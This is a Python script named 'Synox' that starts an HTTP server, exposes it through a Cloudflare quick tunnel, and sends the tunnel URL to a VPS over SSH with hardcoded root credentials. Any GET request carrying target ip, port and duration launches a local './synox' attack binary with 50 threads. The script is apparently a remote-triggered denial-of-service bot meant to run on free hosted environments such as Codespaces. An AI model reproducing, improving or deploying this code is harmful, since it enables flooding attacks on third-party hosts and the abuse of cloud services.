import http.server
import socketserver
import urllib.parse
import subprocess
import random
import threading
import os
import shutil
import paramiko
import re
import time
import sys

# Synox: VPS optional - fill below or comment append_url_to_remote_file call if no VPS
VPS_HOST = "vpsip"  # Synox: अपना VPS IP डाल, else comment SSH
VPS_USER = "root"
VPS_PASS = "password"

TUNNEL_FILE = "synox_tunnel_url.txt"  # Synox file naming

def install_cloudflared():
    print("Synox: cloudflared not found. Installing...")
    try:
        import platform
        system = platform.system().lower()
        if system != "linux":
            print(f"Synox: Unsupported OS: {system}")
            sys.exit(1)
        arch = platform.machine().lower()
        arch_map = {"x86_64": "amd64", "aarch64": "arm64", "armv7l": "arm"}
        arch = arch_map.get(arch, "amd64")
        url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{arch}"
        bin_path = "/usr/local/bin/cloudflared"
        subprocess.run(["curl", "-L", "-o", "cloudflared", url], check=True, capture_output=True)
        subprocess.run(["chmod", "+x", "cloudflared"], check=True, capture_output=True)
        # Sudo for mv - Codespaces allows, but capture to avoid interactive
        result = subprocess.run(["sudo", "mv", "cloudflared", bin_path], capture_output=True)
        if result.returncode != 0:
            print(f"Synox: Sudo mv failed: {result.stderr.decode()}")
            # Fallback: local bin
            os.rename("cloudflared", "./cloudflared")
            os.chmod("./cloudflared", 0o755)
            bin_path = "./cloudflared"
        print(f"Synox: cloudflared installed at {bin_path}")
    except subprocess.CalledProcessError as e:
        print(f"Synox: Install failed: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"Synox: Unexpected install error: {e}")
        sys.exit(1)

def check_cloudflared():
    if shutil.which("cloudflared") is None and os.path.exists("./cloudflared"):
        shutil.which = lambda x: "./cloudflared" if x == "cloudflared" else None  # Hack for local
    if shutil.which("cloudflared") is None:
        install_cloudflared()

def append_url_to_remote_file(new_url, remote_path="/root/synox_tunnel_url.txt"):
    if VPS_HOST == "vpsip":  # Default, skip if not configured
        print("Synox: VPS not configured, skipping remote append.")
        return
    local_temp = "synox_tunnel_temp.txt"
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=10)
        sftp = ssh.open_sftp()
        try:
            sftp.get(remote_path, local_temp)
            print(f"Synox: Downloaded {remote_path} for append.")
        except FileNotFoundError:
            open(local_temp, "w").close()
            print("Synox: Fresh remote file.")
        with open(local_temp, "a") as f:
            f.write(new_url + "\n")
        sftp.put(local_temp, remote_path)
        print(f"Synox: Appended to {remote_path}.")
        sftp.close()
        ssh.close()
        os.remove(local_temp)
    except Exception as e:
        print(f"Synox: SSH append error (ignore if no VPS): {e}")

def start_cloudflared_tunnel(local_port):
    while True:
        cmd = ["cloudflared", "tunnel", "--url", f"http://localhost:{local_port}"]
        print(f"Synox: Starting tunnel on port {local_port}...")
        try:
            # Use text=True for Python 3.12 compat
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            buffer_lines = []
            url_uploaded = False

            for line in iter(proc.stdout.readline, ''):
                sys.stdout.write(line)
                sys.stdout.flush()
                buffer_lines.append(line)
                accumulated = ''.join(buffer_lines[-50:])  # Last 50 lines for match

                if not url_uploaded:
                    match = re.search(r"https://[a-z0-9\-]+\.trycloudflare\.com", accumulated)
                    if match:
                        url = match.group(0)
                        print(f"\nSynox: Detected tunnel: {url}")
                        with open(TUNNEL_FILE, "w") as f:
                            f.write(url + "\n")
                        append_url_to_remote_file(url)
                        url_uploaded = True
                        proc.terminate()
                        return

                if "failed to parse quick Tunnel ID" in line:
                    print("Synox: Tunnel fail, retry 5s...")
                    proc.terminate()
                    time.sleep(5)
                    break

            proc.wait(timeout=1)
        except subprocess.TimeoutExpired:
            proc.kill()
        except Exception as e:
            print(f"Synox: Tunnel error: {e}")
            time.sleep(5)

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        ip = params.get('ip', [None])[0]
        port = params.get('port', [None])[0]
        duration = params.get('duration', [None])[0]
        if not all([ip, port, duration]):
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Synox: Missing params\n")
            return
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Synox Attack triggered!\n")

        def run_attack():
            try:
                # Check binary exists
                if not os.path.exists("./synox"):
                    print("Synox: synox binary missing! Compile first.")
                    return
                subprocess.run(["./synox", ip, port, duration, "50", "-1"], 
                               check=True, capture_output=True)  # Synox: Default 50 threads for free tier
                print(f"Synox C Attack done: {ip}:{port}")
            except subprocess.CalledProcessError as e:
                print(f"Synox: Attack subprocess error: {e}")
            except FileNotFoundError:
                print("Synox: synox not found.")

        threading.Thread(target=run_attack, daemon=True).start()

    def log_message(self, format, *args):
        pass  # Silent logs for clean output

def main():
    check_cloudflared()
    PORT = random.randint(10000, 65000)  # Avoid low ports
    with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
        print(f"Synox HTTP Server on port {PORT} - Ready for attacks")
        tunnel_thread = threading.Thread(target=start_cloudflared_tunnel, args=(PORT,), daemon=True)
        tunnel_thread.start()
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("Synox: Shutting down.")
            httpd.shutdown()

if __name__ == "__main__":
    main()
